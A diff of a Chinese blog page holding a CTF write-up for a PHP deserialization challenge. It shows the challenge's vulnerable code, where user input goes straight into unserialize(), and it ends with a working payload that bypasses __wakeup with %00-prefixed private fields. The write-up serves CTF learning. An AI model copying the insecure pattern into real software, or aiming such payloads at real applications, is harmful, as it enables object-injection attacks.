@@ -251,15 +251,15 @@
 <p>下载解压，发现存在五个文件</p>
 <p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/2.png" alt="2"></p>
 <p>其中三个PHP文件代码分别为</p>
-<!DOCTYPE html>
-<head>
-  <meta charset="UTF-8">
-  <title>I have a cat!</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
-      <link rel="stylesheet" href="style.css">
-<link rel="alternate" href="/atom.xml" title="大周'blog" type="application/atom+xml">
-</head>
-<style>
+<p>index.php</p>
+<pre><code class="php+HTML">&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;I have a cat!&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
+&lt;/head&gt;
+&lt;style&gt;
     #login{   
         position: absolute;   
         top: 50%;   
@@ -272,17 +272,17 @@
         font-size: 2em;   
         margin: 0.67em 0;   
     }
-</style>
-<body>
+&lt;/style&gt;
+&lt;body&gt;
 ```index.php
-<!DOCTYPE html>
-<head>
-  <meta charset="UTF-8">
-  <title>I have a cat!</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
-      <link rel="stylesheet" href="style.css">
-</head>
-<style>
+&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;I have a cat!&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
+&lt;/head&gt;
+&lt;style&gt;
     #login{   
         position: absolute;   
         top: 50%;   
@@ -295,8 +295,8 @@
         font-size: 2em;   
         margin: 0.67em 0;   
     }
-</style>
-<body>
+&lt;/style&gt;
+&lt;body&gt;
 
 
 
@@ -304,67 +304,75 @@
 
 
 
-<div id="world">
-    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
-    </div>
-    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
-    </div>
-    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
-    <?php
-    include 'class.php';
-    $select = $_GET['select'];
+&lt;div id=&quot;world&quot;&gt;
+    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
+    &lt;/div&gt;
+    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！
+    &lt;/div&gt;
+    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;
+    &lt;?php
+    include &#39;class.php&#39;;
+    $select = $_GET[&#39;select&#39;];
     $res=unserialize(@$select);
-    ?>
-    </div>
-    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
-</div>
-<script src="http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js"></script>
-<script src="http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js"></script>
-<script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js"></script>
-<script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js"></script>
-<script src="index.js"></script>
-</body>
+    ?&gt;
+    &lt;/div&gt;
+    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#39;&gt;&lt;/script&gt;
+&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#39;&gt;&lt;/script&gt;
+&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#39;&gt;&lt;/script&gt;
+&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#39;&gt;&lt;/script&gt;
+&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>class.php</p>
+<pre><code class="PHP">&lt;?php
+include &#39;flag.php&#39;;
 
-```
+
+error_reporting(0);
 
 
+class Name{
+    private $username = &#39;nonono&#39;;
+    private $password = &#39;yesyes&#39;;
 
-<p>​```class.php<br>&lt;?php<br>include ‘flag.php’;</p>
-<p>error_reporting(0);</p>
-<p>class Name{<br>    private $username = ‘nonono’;<br>    private $password = ‘yesyes’;</p>
-<pre><code>public function __construct($username,$password){
-    $this-&gt;username = $username;
-    $this-&gt;password = $password;
-}
-
-function __wakeup(){
-    $this-&gt;username = &#39;guest&#39;;
-}
-
-function __destruct(){
-    if ($this-&gt;password != 100) {
-        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
-        echo &quot;You name is: &quot;;
-        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;You password is: &quot;;
-        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
-        die();
+    public function __construct($username,$password){
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
     }
-    if ($this-&gt;username === &#39;admin&#39;) {
-        global $flag;
-        echo $flag;
-    }else{
-        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
-        die();
 
-
+    function __wakeup(){
+        $this-&gt;username = &#39;guest&#39;;
     }
-}</code></pre><p>}<br>?&gt;</p>
-<pre><code>
-```flag.php
-&lt;?php
+
+    function __destruct(){
+        if ($this-&gt;password != 100) {
+            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+            echo &quot;You name is: &quot;;
+            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+            echo &quot;You password is: &quot;;
+            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+            die();
+        }
+        if ($this-&gt;username === &#39;admin&#39;) {
+            global $flag;
+            echo $flag;
+        }else{
+            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
+            die();
+
+
+        }
+    }
+}
+?&gt;</code></pre>
+<p>flag.php</p>
+<pre><code class="php">&lt;?php
 $flag = &#39;Syc{dog_dog_dog_dog}&#39;;
-?&gt;</code></pre><p>可以看到在index.php中包含了class.php 代码如下</p>
+?&gt;</code></pre>
+<p>可以看到在index.php中包含了class.php 代码如下</p>
 <pre><code class="PHP">&lt;?php
     include &#39;class.php&#39;;
     $select = $_GET[&#39;select&#39;];
@@ -393,7 +401,7 @@ echo serialize($a);
 <p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p>
 <p>因此我们在类名和字段名前面加上\0的前缀，而\0 在url栏中会出现空白符，复制的时候丢失，所以我们加上%00</p>
 <p>最后得到payload</p>
-<pre><code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre></body>
+<pre><code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre>
         </div>
         <!-- .entry-content -->
         
@@ -421,7 +429,7 @@ echo serialize($a);
             <a href="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/19313b0d62b27c8ba022f60fbfedd5ee.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/783bf161f47b32882f0e962fd4064de7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
